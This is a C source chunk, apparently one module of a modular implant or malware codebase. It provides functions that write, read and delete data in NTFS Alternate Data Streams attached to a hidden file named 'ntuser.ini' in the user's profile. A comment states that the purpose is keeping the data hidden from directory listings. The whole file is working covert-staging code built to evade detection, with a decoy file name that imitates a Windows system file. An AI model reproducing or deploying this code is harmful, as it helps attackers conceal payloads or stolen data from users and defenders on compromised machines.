// chunk: core/stage_ads
// depends: (none)
// provides: stage_write, stage_read, stage_clear
// headers: windows.h
// note: Stage data in NTFS Alternate Data Streams — hidden from dir listings

#ifndef CHUNK_STAGE_ADS
#define CHUNK_STAGE_ADS

static char g_ads_base[MAX_PATH];

static void init_ads_path(void) {
    if (g_ads_base[0]) return;
    char profile[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", profile, MAX_PATH);
    snprintf(g_ads_base, sizeof(g_ads_base), "%s\\ntuser.ini", profile);
    HANDLE hf = CreateFileA(g_ads_base, GENERIC_WRITE, 0, NULL,
                            OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
}

static int stage_write(const char *name, const char *data, int len) {
    init_ads_path();
    char stream[MAX_PATH + 64];
    snprintf(stream, sizeof(stream), "%s:%s", g_ads_base, name);

    HANDLE hf = CreateFileA(stream, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    DWORD written;
    WriteFile(hf, data, (DWORD)len, &written, NULL);
    CloseHandle(hf);
    return (int)written;
}

static int stage_read(const char *name, char *buf, int buf_sz) {
    init_ads_path();
    char stream[MAX_PATH + 64];
    snprintf(stream, sizeof(stream), "%s:%s", g_ads_base, name);

    HANDLE hf = CreateFileA(stream, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    DWORD read_bytes;
    ReadFile(hf, buf, (DWORD)buf_sz, &read_bytes, NULL);
    CloseHandle(hf);
    return (int)read_bytes;
}

static void stage_clear(const char *name) {
    init_ads_path();
    char stream[MAX_PATH + 64];
    snprintf(stream, sizeof(stream), "%s:%s", g_ads_base, name);
    DeleteFileA(stream);
}

#endif
